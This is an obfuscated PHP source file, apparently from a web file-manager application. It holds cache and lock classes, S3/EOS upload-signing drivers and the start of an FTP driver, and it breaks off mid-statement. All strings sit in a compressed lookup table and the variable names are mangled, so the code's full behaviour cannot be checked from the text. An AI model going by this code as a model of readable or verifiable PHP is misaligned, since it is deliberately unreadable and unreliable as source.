<?php
 goto A•ñ—•¿œ‡; aÆÙ°ÆµÒ†: while ($xawrckpljf < $_SERVER[²Ö÷öõ][680]) { if ($xawrckpljf >= 0) { break; } $xawrckpljf++; } $_SERVER[‹“¬»„ú] = explode($_SERVER[²Ö÷öõ][681], gzinflate(substr($_SERVER[²Ö÷öõ][682], 10, -8))); $wynxhlmpbr = $_SERVER[²Ö÷öõ][683]; goto fÄèé¦›‡±; d»Ó´Ôˆ¯: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¤¬ ·Ë¡ =& $_SERVER[²Ö÷öõ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ô‡şÛÁ = $GLOBALS[$¤¬ ·Ë¡[6]][$¤¬ ·Ë¡[425]]; $¡Ûµµ±å = $Ô‡şÛÁ[$Ô‡şÛÁ[$¤¬ ·Ë¡[909]]]; $Ã‚À¾¼‘ = $Ô‡şÛÁ[$¤¬ ·Ë¡[910]]; switch ($Ô‡şÛÁ[$¤¬ ·Ë¡[909]]) { case $¤¬ ·Ë¡[21]: self::$handle = Model($¤¬ ·Ë¡[911]); break; case $¤¬ ·Ë¡[912]: self::$handle = new CacheRedis($¡Ûµµ±å, $Ã‚À¾¼‘); break; case $¤¬ ·Ë¡[913]: self::$handle = new CacheMemcached($¡Ûµµ±å, $Ã‚À¾¼‘); break; case $¤¬ ·Ë¡[230]: self::$handle = new CacheFile($¡Ûµµ±å, $Ã‚À¾¼‘); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŠØÖåÄ¯) { if (is_array($ŠØÖåÄ¯) || is_object($ŠØÖåÄ¯)) { $ŠØÖåÄ¯ = json_encode($ŠØÖåÄ¯); } $ŠØÖåÄ¯ = rawurlencode($ŠØÖåÄ¯); return md5(KOD_SITE_ID . $_SERVER[²Ö÷öõ][11] . $ŠØÖåÄ¯); } public static function get($óÒ–ğ’ì, $÷·÷İ¤— = false) { $ûˆéÌ”ô = self::key($óÒ–ğ’ì); $ö¼İã¸± = self::init(); if ($÷·÷İ¤—) { return unserialize($ö¼İã¸±->get($ûˆéÌ”ô)); } if (!isset(self::$memoryCache[$ûˆéÌ”ô])) { $ÜãìÄ´¼ = $ö¼İã¸±->get($ûˆéÌ”ô); self::$memoryCache[$ûˆéÌ”ô] = unserialize($ÜãìÄ´¼); } return self::$memoryCache[$ûˆéÌ”ô]; } public static function set($ñÒ›áíã, $‘Ë§ò³Î, $–›”ãç¦ = false) { $Ã½â„„¥ =& $_SERVER[²Ö÷öõ]; $¾ò×È•ä = self::key($ñÒ›áíã); if (isset(self::$memoryCache[$¾ò×È•ä]) && self::$memoryCache[$¾ò×È•ä] === $‘Ë§ò³Î) { return !0; } if ($–›”ãç¦ === 0) { self::$memoryCache[$¾ò×È•ä] = $‘Ë§ò³Î; return !0; } $ÈªÜ°å† = self::init(); $ãŞ”‚Ô× = serialize($‘Ë§ò³Î); CacheLock::lock($ñÒ›áíã . $Ã½â„„¥[914]); $ûÆõšŸ = $ÈªÜ°å†->set($¾ò×È•ä, $ãŞ”‚Ô×, $–›”ãç¦); self::$memoryCache[$¾ò×È•ä] = $‘Ë§ò³Î; CacheLock::unlock($ñÒ›áíã . $Ã½â„„¥[914]); return $ûÆõšŸ; } public static function getCall($ÂÔÛÂ¤Ò, $ğ¾øüÏ¶, $¥î‚Û¬¥, $½ÆåŠò = array()) { $‘’‡õÖ· =& $_SERVER[²Ö÷öõ]; $•©ëÏü† = self::get($ÂÔÛÂ¤Ò); if ($•©ëÏü† || $•©ëÏü† === $‘’‡õÖ·[12]) { return $•©ëÏü†; } $•©ëÏü† = call_user_func_array($¥î‚Û¬¥, $½ÆåŠò); $•©ëÏü† = $•©ëÏü† ? $•©ëÏü† : $‘’‡õÖ·[12]; self::set($ÂÔÛÂ¤Ò, $•©ëÏü†, $ğ¾øüÏ¶); return $•©ëÏü†; } public static function remove($Šèä¬×€) { $„ÑüÏ†¶ = self::key($Šèä¬×€); unset(self::$memoryCache[$„ÑüÏ†¶]); self::clearTimeout(); CacheLock::lock($Šèä¬×€); $ë—Ì¦¾Ü = self::init()->remove($„ÑüÏ†¶); CacheLock::unlock($Šèä¬×€); return $ë—Ì¦¾Ü; } public static function removeMemory($èÓ€ÆĞ) { $ßûêªß° = self::key($èÓ€ÆĞ); unset(self::$memoryCache[$ßûêªß°]); } public static function clearMemory($èùÒ‹ = false) { if ($èùÒ‹) { $èùÒ‹ = self::key($èùÒ‹); unset(self::$memoryCache[$èùÒ‹]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[²Ö÷öõ][915])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[²Ö÷öõ][916])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ ¦–Äï±, $ãúÛŞˆÖ) { $î™›öÛ· =& $_SERVER[²Ö÷öõ]; $this->cachePath = $ ¦–Äï±[$î™›öÛ·[87]]; $this->prefix = $î™›öÛ·[917]; $this->cacheTime = $ãúÛŞˆÖ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($œ‰ıØñ¨) { $úÉˆŒ¬ =& $_SERVER[²Ö÷öõ]; $œ‰ıØñ¨ = str_replace(array($úÉˆŒ¬[918], $úÉˆŒ¬[100], $úÉˆŒ¬[76]), $úÉˆŒ¬[919], $œ‰ıØñ¨); return $this->cachePath . $úÉˆŒ¬[920] . $œ‰ıØñ¨ . $úÉˆŒ¬[921]; } public function set($ƒÆ§ø£Ó, $’ÑŒÃ³Ñ, $—î°òœÛ = false) { $—î°òœÛ = $—î°òœÛ ? $—î°òœÛ : $this->cacheTime; $Ã£Ó£ß¿ = $this->getFile($ƒÆ§ø£Ó); if (file_put_contents($Ã£Ó£ß¿, $this->prefix . $’ÑŒÃ³Ñ, LOCK_EX)) { @touch($Ã£Ó£ß¿, intval(time() + $—î°òœÛ)); clearstatcache(); return !0; } @unlink($Ã£Ó£ß¿); return !1; } public function get($ÑªŒã„) { $§İ˜¿… = $this->getFile($ÑªŒã„); if (file_exists($§İ˜¿…) && filemtime($§İ˜¿…) < time()) { @unlink($§İ˜¿…); return !1; } $¯†«¦Üœ = @file_get_contents($§İ˜¿…); return substr($¯†«¦Üœ, strlen($this->prefix)); } public function remove($ĞáÀëÕÚ) { $¡‚Ö¯åå = $this->getFile($ĞáÀëÕÚ); return @unlink($¡‚Ö¯åå); } public function deleteAll() { $êÃöÌ‡î =& $_SERVER[²Ö÷öõ]; $¡ÀØêË° = scandir($this->cachePath); foreach ($¡ÀØêË° as $”¨¡¶é) { $ŠïÎÀùÅ = $this->cachePath . $”¨¡¶é; if (strpos($ŠïÎÀùÅ, $êÃöÌ‡î[921]) && strpos($ŠïÎÀùÅ, $êÃöÌ‡î[922])) { @unlink($ŠïÎÀùÅ); } } } public function clearTimeout() { $”­€È¨¤ =& $_SERVER[²Ö÷öõ]; $ªÑŸ·Ïü = scandir($this->cachePath); foreach ($ªÑŸ·Ïü as $‡Ã¾ìÃ²) { $†å²Ò‡ = $this->cachePath . $‡Ã¾ìÃ²; if (strpos($†å²Ò‡, $”­€È¨¤[921]) && strpos($†å²Ò‡, $”­€È¨¤[922]) && filemtime($†å²Ò‡) < time()) { @unlink($†å²Ò‡); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $½ìŞ–Ë› =& $_SERVER[²Ö÷öõ]; if (self::$handle) { return self::$handle; } $ÑºíŸÜú = $GLOBALS[$½ìŞ–Ë›[6]][$½ìŞ–Ë›[425]]; self::$timeout = $ÑºíŸÜú[$½ìŞ–Ë›[923]] ? $ÑºíŸÜú[$½ìŞ–Ë›[923]] : 10; $ øˆ¿Àö = _get($GLOBALS[$½ìŞ–Ë›[6]], $½ìŞ–Ë›[924]); $Ñ¤ÙŸ€ë = $ÑºíŸÜú[$½ìŞ–Ë›[909]] ? $ÑºíŸÜú[$½ìŞ–Ë›[909]] : $½ìŞ–Ë›[230]; if ($Ñ¤ÙŸ€ë == $½ìŞ–Ë›[21] && $ øˆ¿Àö == $½ìŞ–Ë›[13]) { $Ñ¤ÙŸ€ë = $½ìŞ–Ë›[230]; } switch ($Ñ¤ÙŸ€ë) { case $½ìŞ–Ë›[912]: self::$handle = new CacheLockRedis(); break; case $½ìŞ–Ë›[913]: self::$handle = new CacheLockMemcached(); break; case $½ìŞ–Ë›[21]: self::$handle = new CacheLockDatabase(); break; case $½ìŞ–Ë›[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($½ìŞ–Ë›[925], $½ìŞ–Ë›[926]); } return self::$handle; } private static function key($‹ß®œíª) { return $_SERVER[²Ö÷öõ][927] . Cache::key($‹ß®œíª); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($à°Œ£Á = '') { self::$errorMsg = $à°Œ£Á; } public static function lockGlobal($Ñ¾èÎªî, $ùºÑÎ¤å) { return self::lock($Ñ¾èÎªî, $ùºÑÎ¤å, !0); } public static function lock($†²¼ØÆ”, $´Å¾è¼— = false, $îıüŞÌõ = false) { $³µöí¯ =& $_SERVER[²Ö÷öõ]; $³‰Ì©Ğ = self::init(); $ñîØ¡ˆ” = self::key($†²¼ØÆ”); $´Å¾è¼— = $´Å¾è¼— ? $´Å¾è¼— : self::$timeout; $½Ÿèûğ = timeFloat(); $Î£Á¥«¬ = $³‰Ì©Ğ->lock($ñîØ¡ˆ”, $´Å¾è¼—); $¸«ş¯´ = timeFloat(); if (!$Î£Á¥«¬) { $å³±÷© = "\x6c\x6f\x63\x6b\x20\145\x72\162\x6f\x72\73\x6b\145\x79\75{$†²¼ØÆ”}\x3b\164\151\x6d\x65\75{$´Å¾è¼—}\73" . self::$errorMsg . $³µöí¯[74] . get_caller_msg(); $óÌêª» = LNG($³µöí¯[928]) . "\x28{$´Å¾è¼—}\x73\51\x2e" . LNG($³µöí¯[929]); $óÌêª» .= $³µöí¯[930]; if (is_string(self::$errorMsg) && self::$errorMsg) { $óÌêª» = $óÌêª» . $³µöí¯[931] . self::$errorMsg; } write_log($³µöí¯[932] . sprintf($³µöí¯[933], timeFloat() - $½Ÿèûğ) . $³µöí¯[934] . $å³±÷© . $³µöí¯[935] . error_get_last(), $³µöí¯[926]); show_json($óÌêª», !1); } if (!$îıüŞÌõ) { self::$lockItem[$ñîØ¡ˆ”] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÍôÖ = number_format(timeFloat() - $¸«ş¯´, 3); write_log($³µöí¯[936] . $†²¼ØÆ” . $³µöí¯[937] . $ÍôÖ, $³µöí¯[926]); } return $Î£Á¥«¬; } public static function lockGet($±ø®Œ¯) { $¨‚è­Ìã = self::key($±ø®Œ¯); if (self::$lockItem[$¨‚è­Ìã]) { return self::$lockItem[$¨‚è­Ìã]; } return self::init()->lockGet($¨‚è­Ìã); } public static function unlock($™½¾ãï) { $Úíöøá =& $_SERVER[²Ö÷öõ]; $­¢Æê€Î = self::key($™½¾ãï); self::$lockItem[$­¢Æê€Î] = null; self::init()->unlock($­¢Æê€Î); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Úíöøá[938] . $™½¾ãï, $Úíöøá[926]); } return; } public static function unlockRuntime() { $ß”‹¤ï¬ =& $_SERVER[²Ö÷öõ]; $‡º‘Ë = self::init(); $ê©¹˜Š = !1; foreach (self::$lockItem as $‘º’£û¦ => $¹ ¤»´³) { if (!$¹ ¤»´³) { continue; } $‡º‘Ë->unlock($‘º’£û¦); if (!$ê©¹˜Š) { $ê©¹˜Š = !0; write_log($ß”‹¤ï¬[939] . $‘º’£û¦ . $ß”‹¤ï¬[74] . get_caller_msg(), $ß”‹¤ï¬[926]); continue; } write_log($ß”‹¤ï¬[939] . $‘º’£û¦, $ß”‹¤ï¬[926]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ú¤ã¥±¾ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ß”‹¤ï¬[940] . $ú¤ã¥±¾ . $ß”‹¤ï¬[941] . ACTION, $ß”‹¤ï¬[926]); } } public static function fileLock($¶ñÜÏô) { $…Ú©©°½ =& $_SERVER[²Ö÷öõ]; if (!$GLOBALS[$…Ú©©°½[942]]) { $GLOBALS[$…Ú©©°½[942]] = array(); } $GLOBALS[$…Ú©©°½[942]][$¶ñÜÏô] = !1; $²”İçÔ = fopen(DATA_PATH . $¶ñÜÏô . $…Ú©©°½[943], $…Ú©©°½[944]); if (!$²”İçÔ) { return !1; } $GLOBALS[$…Ú©©°½[942]][$¶ñÜÏô] = $²”İçÔ; if (flock($²”İçÔ, LOCK_EX)) { return !0; } self::unlock($¶ñÜÏô); show_json($…Ú©©°½[945], !1); return !1; } public static function fileUnlock($¡¾„˜×Ş) { $ã¤×àœ =& $_SERVER[²Ö÷öõ]; $’—ôşÈ¨ = $GLOBALS[$ã¤×àœ[942]][$¡¾„˜×Ş]; if (!$’—ôşÈ¨) { return; } $GLOBALS[$ã¤×àœ[942]][$¡¾„˜×Ş] = !1; flock($’—ôşÈ¨, LOCK_UN); fclose($’—ôşÈ¨); } public static function fileUnlockAll() { $õèó«Ö¬ =& $_SERVER[²Ö÷öõ]; if (!isset($GLOBALS[$õèó«Ö¬[942]]) || !$GLOBALS[$õèó«Ö¬[942]]) { return; } foreach ($GLOBALS[$õèó«Ö¬[942]] as $²†Ìóï => $›¯º¶ŞÍ) { if (!$›¯º¶ŞÍ) { continue; } $GLOBALS[$õèó«Ö¬[942]][$²†Ìóï] = !1; flock($›¯º¶ŞÍ, LOCK_UN); fclose($›¯º¶ŞÍ); } $GLOBALS[$õèó«Ö¬[942]] = array(); } } goto A§¿±–È è; c×Íæ¾ˆ©¦: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ì¥Ó“±) { parent::__construct($ì¥Ó“±); } public function uploadFormData($øòÚî‘á, $´ø§·Ô… = 3600) { $Ï¢›ÎóÕ =& $_SERVER[²Ö÷öõ]; $Óş üÖ» = $Ï¢›ÎóÕ[229]; $µùÉ‡æŒ = $Ï¢›ÎóÕ[270]; $„š»Ê±ù = $Ï¢›ÎóÕ[62]; $Úˆ¨˜ûÍ = gmdate($Ï¢›ÎóÕ[271]); $Äéˆã¾Î = gmdate($Ï¢›ÎóÕ[272]); $Ã¡à¦£‚ = $Ï¢›ÎóÕ[273]; $üÜÜÆÕÂ = $´ø§·Ô… . $Ï¢›ÎóÕ[12]; $¶“ì×³À = $Ï¢›ÎóÕ[274]; $–õ³Ì×Š = array($this->accessKey, $Äéˆã¾Î, $this->region, $„š»Ê±ù, $Ã¡à¦£‚); $¬ãİº€Œ = implode($Ï¢›ÎóÕ[8], $–õ³Ì×Š); $šÀÚÎàµ = array($Ï¢›ÎóÕ[275] => gmdate($Ï¢›ÎóÕ[299], strtotime($Ï¢›ÎóÕ[277])), $Ï¢›ÎóÕ[278] => array(array($Ï¢›ÎóÕ[279] => $this->bucket), array($Ï¢›ÎóÕ[280] => $Óş üÖ»), array($Ï¢›ÎóÕ[281], $Ï¢›ÎóÕ[282], $Ï¢›ÎóÕ[12]), array($Ï¢›ÎóÕ[281], $Ï¢›ÎóÕ[283], $Ï¢›ÎóÕ[12]), array($Ï¢›ÎóÕ[281], $Ï¢›ÎóÕ[284], $Ï¢›ÎóÕ[12]), array($Ï¢›ÎóÕ[285] => $¶“ì×³À), array($Ï¢›ÎóÕ[286] => $¬ãİº€Œ), array($Ï¢›ÎóÕ[287] => $µùÉ‡æŒ), array($Ï¢›ÎóÕ[288] => $Úˆ¨˜ûÍ), array($Ï¢›ÎóÕ[289] => $üÜÜÆÕÂ))); $Äö¯‹åì = base64_encode(json_encode($šÀÚÎàµ)); $¢˜œèËÇ = hash_hmac($Ï¢›ÎóÕ[290], $Äéˆã¾Î, $Ï¢›ÎóÕ[291] . $this->secret, !0); $ÓÁ²Úâ¯ = hash_hmac($Ï¢›ÎóÕ[290], $this->region, $¢˜œèËÇ, !0); $Í–ø„ãÔ = hash_hmac($Ï¢›ÎóÕ[290], $„š»Ê±ù, $ÓÁ²Úâ¯, !0); $´¡»æº” = hash_hmac($Ï¢›ÎóÕ[290], $Ã¡à¦£‚, $Í–ø„ãÔ, !0); $ÜÀÎÙ¹´ = hash_hmac($Ï¢›ÎóÕ[290], $Äö¯‹åì, $´¡»æº”); $¨ÂÃŠÅ = array($Ï¢›ÎóÕ[246] => $Ï¢›ÎóÕ[12], $Ï¢›ÎóÕ[292] => $Ï¢›ÎóÕ[12], $Ï¢›ÎóÕ[280] => $Óş üÖ», $Ï¢›ÎóÕ[285] => $¶“ì×³À, $Ï¢›ÎóÕ[293] => $Äö¯‹åì, $Ï¢›ÎóÕ[294] => $¬ãİº€Œ, $Ï¢›ÎóÕ[295] => $µùÉ‡æŒ, $Ï¢›ÎóÕ[296] => $Úˆ¨˜ûÍ, $Ï¢›ÎóÕ[297] => $üÜÜÆÕÂ, $Ï¢›ÎóÕ[298] => $ÜÀÎÙ¹´, $Ï¢›ÎóÕ[208] => $this->getHost()); return $¨ÂÃŠÅ; } public function multiUploadFormData($¶âÄ, $ŸµÁ‘¹´ = 3600) { $á¯ÔËç =& $_SERVER[²Ö÷öõ]; $·³»äµ’ = gmdate($á¯ÔËç[300]); $‘åôç = array(); $‡´·ãÁ§ = $this->client->getUploadId($this->bucket, $¶âÄ, $‘åôç); if (!$‡´·ãÁ§) { return !1; } return array($á¯ÔËç[254] => $‡´·ãÁ§, $á¯ÔËç[208] => $this->getHost() . $á¯ÔËç[8] . $this->pathEncode($¶âÄ), $á¯ÔËç[255] => $·³»äµ’, $á¯ÔËç[97] => $¶âÄ); } public function multiUploadAuthData($ßüÁ‘…—, $Ğ÷ø¯’ = array()) { $¿ØŠşÆµ =& $_SERVER[²Ö÷öõ]; $§’ö’Êø = isset($Ğ÷ø¯’[$¿ØŠşÆµ[169]]) ? $Ğ÷ø¯’[$¿ØŠşÆµ[169]] : $¿ØŠşÆµ[12]; $ÀÄ­ÇŒ = $Ğ÷ø¯’[$¿ØŠşÆµ[97]]; unset($Ğ÷ø¯’[$¿ØŠşÆµ[97]]); if (isset($Ğ÷ø¯’[$¿ØŠşÆµ[256]])) { return $this->listUploadParts($ÀÄ­ÇŒ, $Ğ÷ø¯’); } $ĞÂ€”¦¾ = array(); if (isset($Ğ÷ø¯’[$¿ØŠşÆµ[301]])) { $ĞÂ€”¦¾[$¿ØŠşÆµ[302]] = $Ğ÷ø¯’[$¿ØŠşÆµ[301]]; } $¡äØòÍü = explode($¿ØŠşÆµ[210], $this->getHost()); $èßáŒúå = array($¿ØŠşÆµ[303] => $¡äØòÍü[1], $¿ØŠşÆµ[304] => $¿ØŠşÆµ[12], $¿ØŠşÆµ[246] => $¿ØŠşÆµ[123], $¿ØŠşÆµ[292] => $Ğ÷ø¯’[$¿ØŠşÆµ[79]]); $ØÆ¿÷©» = $¿ØŠşÆµ[259]; $‘ğ®ıéÒ = $¿ØŠşÆµ[8] . $this->pathEncode($ÀÄ­ÇŒ) . $§’ö’Êø; $à“Òî‰ß = $this->client->__getSignatureV4($ĞÂ€”¦¾, $èßáŒúå, $ØÆ¿÷©», $‘ğ®ıéÒ); if (strpos($§’ö’Êø, $¿ØŠşÆµ[258]) === 0) { if (isset($ĞÂ€”¦¾[$¿ØŠşÆµ[302]])) { $Ùõ³£ßˆ = $ĞÂ€”¦¾[$¿ØŠşÆµ[302]]; } else { if (isset($à“Òî‰ß[$¿ØŠşÆµ[302]])) { $Ùõ³£ßˆ = $à“Òî‰ß[$¿ØŠşÆµ[302]]; } else { $Ùõ³£ßˆ = hash($¿ØŠşÆµ[290], $¿ØŠşÆµ[12]); } } return array($¿ØŠşÆµ[265] => $à“Òî‰ß[$¿ØŠşÆµ[265]], $¿ØŠşÆµ[302] => $Ùõ³£ßˆ, $¿ØŠşÆµ[255] => $à“Òî‰ß[$¿ØŠşÆµ[305]]); } return $à“Òî‰ß[$¿ØŠşÆµ[265]]; } public function listUploadParts($¼ï¹•ØÅ, $£ÉÉ­±¸ = array()) { $ÙŒ¾äÌæ =& $_SERVER[²Ö÷öõ]; $ÁÔÍ„Â“ = str_replace($ÙŒ¾äÌæ[266], $ÙŒ¾äÌæ[12], $£ÉÉ­±¸[$ÙŒ¾äÌæ[169]]); $²ÔåÒ÷ä = $this->client->listParts($this->bucket, $¼ï¹•ØÅ, $ÁÔÍ„Â“); if (!$²ÔåÒ÷ä) { return !1; } $ïÚ Ä­á = $ÙŒ¾äÌæ[306]; foreach ($²ÔåÒ÷ä as $±Íãêœƒ) { $ïÚ Ä­á .= $ÙŒ¾äÌæ[307] . "\74\x50\x61\x72\164\116\165\155\x62\x65\162\76{$±Íãêœƒ[$ÙŒ¾äÌæ[308]]}\74\x2f\x50\x61\162\164\116\x75\x6d\x62\x65\162\76\12" . "\x3c\105\124\x61\x67\76{$±Íãêœƒ[$ÙŒ¾äÌæ[309]]}\74\57\105\124\141\x67\x3e\12" . $ÙŒ¾äÌæ[310]; } $ïÚ Ä­á .= $ÙŒ¾äÌæ[311]; $ëéÑ¹Ë‚ = array(); $Ü¸À¬úĞ = explode($ÙŒ¾äÌæ[210], $this->getHost()); $äòş€¨ = array($ÙŒ¾äÌæ[303] => $Ü¸À¬úĞ[1], $ÙŒ¾äÌæ[246] => $ÙŒ¾äÌæ[123], $ÙŒ¾äÌæ[292] => strlen($ïÚ Ä­á)); $¼¾êŒÀ = $ÙŒ¾äÌæ[257]; $ä…÷Íï² = $ÙŒ¾äÌæ[8] . $this->pathEncode($¼ï¹•ØÅ) . $£ÉÉ­±¸[$ÙŒ¾äÌæ[169]]; $¯ş¬½ùç = $this->client->__getSignatureV4($ëéÑ¹Ë‚, $äòş€¨, $¼¾êŒÀ, $ä…÷Íï², $ïÚ Ä­á); return array($ÙŒ¾äÌæ[265] => $¯ş¬½ùç[$ÙŒ¾äÌæ[265]], $ÙŒ¾äÌæ[255] => $¯ş¬½ùç[$ÙŒ¾äÌæ[305]], $ÙŒ¾äÌæ[267] => $²ÔåÒ÷ä, $ÙŒ¾äÌæ[302] => $¯ş¬½ùç[$ÙŒ¾äÌæ[302]]); } public function link($§–¯÷¬œ, $¤Ñ¢ğ•¨ = array()) { return parent::link($§–¯÷¬œ, $¤Ñ¢ğ•¨); } public function fileOut($¶´ìêñ, $ôÔ™ŒÌ¸ = false, $ßûûôÒ = false, $½¿œûÁÒ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[²Ö÷öõ][312])) { return parent::fileOutServer($¶´ìêñ, $ôÔ™ŒÌ¸, $ßûûôÒ, $½¿œûÁÒ); } parent::fileOut($¶´ìêñ, $ôÔ™ŒÌ¸, $ßûûôÒ, $½¿œûÁÒ); } public function fileOutImage($“ÍÀÙŸ, $¨Éãîğğ = 250) { if (strstr($this->endpoint, $_SERVER[²Ö÷öõ][312])) { return parent::fileOutImageServer($“ÍÀÙŸ, $¨Éãîğğ); } parent::fileOutImage($“ÍÀÙŸ, $¨Éãîğğ); } public function fileOutLink($¥±Ë´õ) { $Ó¿™ –İ =& $_SERVER[²Ö÷öõ]; if (substr($¥±Ë´õ, 0, 7) == $Ó¿™ –İ[313]) { $¥±Ë´õ = $Ó¿™ –İ[314] . substr($¥±Ë´õ, 7); } header($Ó¿™ –İ[175] . $¥±Ë´õ); die; } } define($_SERVER[²Ö÷öõ][315], 1); define($_SERVER[²Ö÷öõ][316], 2); goto fÖ±Ñ†î§; aˆñ»ã¥: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ƒ³°¶¶) { parent::__construct($ƒ³°¶¶); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } public function uploadFormData($ú€ó”ô, $£Âˆ‰×Æ = 3600) { $ı†Ä³ø— =& $_SERVER[²Ö÷öõ]; $şŠ†ô·™ = $ı†Ä³ø—[229]; $¦öØí‹ù = $ı†Ä³ø—[270]; $°çêÉËº = $ı†Ä³ø—[62]; $êÕ…ö¹« = gmdate($ı†Ä³ø—[271]); $òã°íòí = gmdate($ı†Ä³ø—[272]); $ë³Ó¢· = $ı†Ä³ø—[273]; $¨ç±±Û° = $£Âˆ‰×Æ . $ı†Ä³ø—[12]; $ê±—‚ = $ı†Ä³ø—[274]; $ëóä…òÒ = array($this->accessKey, $òã°íòí, $this->region, $°çêÉËº, $ë³Ó¢·); $È‰ªìğÎ = implode($ı†Ä³ø—[8], $ëóä…òÒ); $ˆÕ»à = array($ı†Ä³ø—[275] => gmdate($ı†Ä³ø—[299], strtotime($ı†Ä³ø—[277])), $ı†Ä³ø—[278] => array(array($ı†Ä³ø—[279] => $this->bucket), array($ı†Ä³ø—[280] => $şŠ†ô·™), array($ı†Ä³ø—[281], $ı†Ä³ø—[282], $ı†Ä³ø—[12]), array($ı†Ä³ø—[281], $ı†Ä³ø—[283], $ı†Ä³ø—[12]), array($ı†Ä³ø—[281], $ı†Ä³ø—[284], $ı†Ä³ø—[12]), array($ı†Ä³ø—[285] => $ê±—‚), array($ı†Ä³ø—[286] => $È‰ªìğÎ), array($ı†Ä³ø—[287] => $¦öØí‹ù), array($ı†Ä³ø—[288] => $êÕ…ö¹«), array($ı†Ä³ø—[289] => $¨ç±±Û°))); $†¼§ = base64_encode(json_encode($ˆÕ»à)); $Õ³„íï‚ = hash_hmac($ı†Ä³ø—[290], $òã°íòí, $ı†Ä³ø—[291] . $this->secret, !0); $¡Ï˜±õ¨ = hash_hmac($ı†Ä³ø—[290], $this->region, $Õ³„íï‚, !0); $¬ãÎğî = hash_hmac($ı†Ä³ø—[290], $°çêÉËº, $¡Ï˜±õ¨, !0); $¦°âƒˆ¤ = hash_hmac($ı†Ä³ø—[290], $ë³Ó¢·, $¬ãÎğî, !0); $øİÂ­Ñ´ = hash_hmac($ı†Ä³ø—[290], $†¼§, $¦°âƒˆ¤); $‰”à‚Øº = array($ı†Ä³ø—[246] => $ı†Ä³ø—[12], $ı†Ä³ø—[292] => $ı†Ä³ø—[12], $ı†Ä³ø—[280] => $şŠ†ô·™, $ı†Ä³ø—[285] => $ê±—‚, $ı†Ä³ø—[293] => $†¼§, $ı†Ä³ø—[294] => $È‰ªìğÎ, $ı†Ä³ø—[295] => $¦öØí‹ù, $ı†Ä³ø—[296] => $êÕ…ö¹«, $ı†Ä³ø—[297] => $¨ç±±Û°, $ı†Ä³ø—[298] => $øİÂ­Ñ´, $ı†Ä³ø—[208] => $this->getHost()); return $‰”à‚Øº; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($…ˆ€Â‹¿) { parent::__construct(); if (count($…ˆ€Â‹¿) > 0) { $this->_init($…ˆ€Â‹¿); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($æôß‚î) { $Ù¢Ÿ¬®† =& $_SERVER[²Ö÷öõ]; global $config; $this->appCharset = $config[$Ù¢Ÿ¬®†[1446]]; $this->systemCharset = $config[$Ù¢Ÿ¬®†[1447]]; if (isset($æôß‚î[$Ù¢Ÿ¬®†[1448]]) && $æôß‚î[$Ù¢Ÿ¬®†[1448]]) { $this->systemCharset = $æôß‚î[$Ù¢Ÿ¬®†[1448]]; } } public function iconvApp($¿¯åÓ©Ÿ) { return $this->iconvTo($¿¯åÓ©Ÿ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ºÔ“ëİØ) { return $this->iconvTo($ºÔ“ëİØ, $this->appCharset, $this->systemCharset); } public function getPathOuter($‹¢÷çÛ) { $àŠ¬’ú® =& $_SERVER[²Ö÷öõ]; $Ù§ˆÁğü = $this->iconvApp($this->pathBase); $‹¢÷çÛ = $this->iconvApp($‹¢÷çÛ); if (substr($Ù§ˆÁğü, 0, 2) == $àŠ¬’ú®[1420]) { $Ù§ˆÁğü = BASIC_PATH . substr($Ù§ˆÁğü, 2); } if (substr($‹¢÷çÛ, 0, 2) == $àŠ¬’ú®[1420]) { $‹¢÷çÛ = BASIC_PATH . substr($‹¢÷çÛ, 2); } $Ù§ˆÁğü = KodIO::clear($Ù§ˆÁğü); $‹¢÷çÛ = KodIO::clear($‹¢÷çÛ); $‹¢÷çÛ = substr($‹¢÷çÛ, strlen($Ù§ˆÁğü)); if (empty($this->pathDriver)) { return $‹¢÷çÛ; } return $this->pathDriver . $àŠ¬’ú®[8] . ltrim($‹¢÷çÛ, $àŠ¬’ú®[8]); } private function _init($ºÍÛÉî» = array()) { $è”˜Íõ =& $_SERVER[²Ö÷öõ]; if (!function_exists($è”˜Íõ[1449])) { throw new Exception(LNG($è”˜Íõ[1450])); } $this->config = $ºÍÛÉî»; $this->charsetReset($ºÍÛÉî»); foreach ($ºÍÛÉî» as $—³¯“ª» => $å¼ÔÑº´) { if (isset($this->{$—³¯“ª»})) { $this->{$—³¯“ª»} = $å¼ÔÑº´; } } return $this->_login($ºÍÛÉî»); } private function _login($‹ù„¦¼ª) { $­µ×è—³ =& $_SERVER[²Ö÷öõ]; static $íï„ª¤ = array(); $‘Øş¼§… = md5(json_encode($‹ù„¦¼ª)); if (isset($íï„ª¤[$‘Øş¼§…])) { foreach ($íï„ª¤[$‘Øş¼§…] as $¤˜°¤Åû => $İ–€–·Ò) { $this->{$¤˜°¤Åû} = $İ–€–·Ò; } return !0; } $©À¹ÁĞ = parse_url(trim($this->server, $­µ×è—³[8])); $this->host = $©À¹ÁĞ[$­µ×è—³[208]]; $ıë¼©Ê— = 